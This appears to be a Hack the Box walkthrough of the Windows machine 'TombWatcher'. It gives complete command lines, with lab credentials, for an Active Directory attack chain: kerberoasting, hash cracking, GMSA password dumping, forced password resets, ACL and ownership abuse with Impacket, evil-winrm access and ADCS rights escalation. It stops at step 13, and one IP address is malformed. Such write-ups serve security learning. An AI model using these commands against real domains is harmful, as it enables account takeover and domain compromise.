# TombWatcher

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

![image](https://github.com/user-attachments/assets/38c052d5-4737-4dd6-a5ab-eddd228b28da)

2. With Henry's credentials, enumerate network using Bloodhound. Found high-level path to machine

![image](https://github.com/user-attachments/assets/acff890c-ed2b-45b7-a016-f0f7f93aebef)

3. With Henry's credentials, do a targeted kerberoast attack on Alfred
`targetedKerberoast.py -v -d tombwatcher.htb -u henry -p H3nry_987TGV!`

4. We crack the hash using hashcat and we get Alfred's password: basketball
`hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt`

![image](https://github.com/user-attachments/assets/60b15e59-d3fe-4e3a-b44e-e668b79b5e84)

5. Add Alfred to Infrastructure group using BloodyAD
`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.3 -d TOMBWATCHER.HTB -u ALFRED -p basketball add groupMember INFRASTRUCTURE ALFRED`

6. Get GMSA password using netexec
`nxc ldap 10.129.47.3 -u alfred -p basketball --gmsa`

![image](https://github.com/user-attachments/assets/cbdf43c4-6647-4fa9-a0a3-e2b0588ebf90)

7. Ansible_dev$ has ForceChangePassword priv on Sam. Use ansible_dev$'s hash to change Sam's password
`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.3 -d TOMBWATCHER.HTB -u "ansible_dev\$" -p ":4b21348ca4a9edff9689cdf75cbda439" set password sam Password1`

8. Sam has WriteOwner privilege on John. Change John's owner to Sam using Impacket's owneredit.py script
`sudo python3 /usr/lib/python3/dist-packages/impacket/examples/owneredit.py -action write  -target 'John' -dc-ip 10.129.47.3 -new-owner 'sam' 'tombwatcher.htb'/'sam':'Password1'` 

![image](https://github.com/user-attachments/assets/7aaa18a9-d749-4a41-9860-1e97ad98812f)

9. Now that Sam is owner of John, give Sam FullControl rights on John's account with Impacket's dacledit.py script.
`sudo python3 /usr/lib/python3/dist-packages/impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password1' -dc-ip 10.129.47.32.88`

10. Can now change John's password
`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.32.88 -d tombwatcher.htb -u sam -p Password1 set password john Password123`

11. John can PSRemote into the machine, so with evil-winrm we gain access to the box and get the user flag!

![image](https://github.com/user-attachments/assets/9622d803-053e-47d6-b7f0-bc889232e4fe)

12. From here, John has GenericAll privileges on the Certificate Services, ADCS, so give John FullControl of ADCS.
`dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Password123' -dc-ip 10.129.32.88`

![image](https://github.com/user-attachments/assets/b35acffb-19d6-4dcc-9fc6-a9ca3e13c40b)

13. Using Powershell, we look for all users in the ADCS group, but returns none.
`Get-ADUser -Filter * -SearchBase "OU=ADCS,DC=TOMBWATCHER,DC=HTB"`



